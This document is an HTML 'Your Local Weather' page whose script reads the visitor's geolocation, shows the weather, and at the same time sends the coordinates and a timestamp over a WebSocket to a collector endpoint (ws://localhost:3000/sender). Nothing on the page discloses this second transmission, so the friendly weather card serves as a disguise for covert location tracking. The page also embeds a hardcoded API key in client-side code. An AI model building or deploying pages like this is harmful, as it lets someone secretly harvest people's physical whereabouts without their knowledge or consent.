<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Weather Info</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(to right, #89f7fe, #66a6ff);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #fff;
    }
    .card {
      background: rgba(255, 255, 255, 0.1);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
      backdrop-filter: blur(10px);
      text-align: center;
      max-width: 400px;
    }
    h1 { font-size: 2rem; margin-bottom: 1rem; }
    .info { margin-top: 1rem; font-size: 1.1rem; }
  </style>
</head>
<body>

  <div class="card">
    <h1>🌤️ Your Local Weather</h1>
    <div id="weather">Detecting location...</div>
  </div>

  <script>
    const weatherDiv = document.getElementById("weather");
    const ws = new WebSocket("ws://localhost:3000/sender");

    function fetchWeather(lat, lon) {
      const apiKey = "65addea1b9d41be1666e43ec6356de1f";
      const url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${apiKey}&units=metric`;

      fetch(url)
        .then(res => res.json())
        .then(data => {
          const temp = data.main.temp;
          const city = data.name;
          const condition = data.weather[0].description;
          weatherDiv.innerHTML = `
            <div class="info">📍 <strong>${city}</strong></div>
            <div class="info">🌡️ <strong>${temp}°C</strong></div>
            <div class="info">☁️ ${condition}</div>
          `;
        })
        .catch(() => {
          weatherDiv.textContent = "⚠️ Unable to fetch weather.";
        });
    }

    function sendLocation(lat, lon) {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ latitude: lat, longitude: lon, timestamp: new Date().toISOString() }));
      } else {
        ws.addEventListener('open', () => {
          ws.send(JSON.stringify({ latitude: lat, longitude: lon, timestamp: new Date().toISOString() }));
        });
      }
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;

        fetchWeather(lat, lon);
        sendLocation(lat, lon);
      },
      () => {
        weatherDiv.textContent = "⚠️ Location access denied.";
      }
    );
  </script>

</body>
</html>
